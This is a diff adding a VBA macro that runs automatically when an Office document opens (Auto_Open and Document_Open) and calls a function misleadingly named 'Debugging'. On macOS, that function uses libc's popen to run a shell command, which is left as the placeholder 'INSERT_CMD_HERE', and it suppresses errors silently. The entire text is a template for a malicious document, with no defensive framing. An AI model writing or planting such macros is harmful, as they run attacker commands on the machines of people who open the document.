@@ -1,0 +1,21 @@
+        Private Declare PtrSafe Function system Lib "/usr/lib/libc.dylib" Alias "popen" (ByVal command As String, ByVal mode As String) as LongPtr
+
+        Sub Auto_Open()
+            'MsgBox("Auto_Open()")
+            Debugging
+        End Sub
+
+        Sub Document_Open()
+            'MsgBox("Document_Open()")
+            Debugging
+        End Sub
+
+        Public Function Debugging() As Variant
+            On Error Resume Next
+                    #If Mac Then
+                            Dim result As LongPtr
+                            Dim cmd As String
+                            
+                            result = system("INSERT_CMD_HERE", "r")
+                    #End If
+        End Function
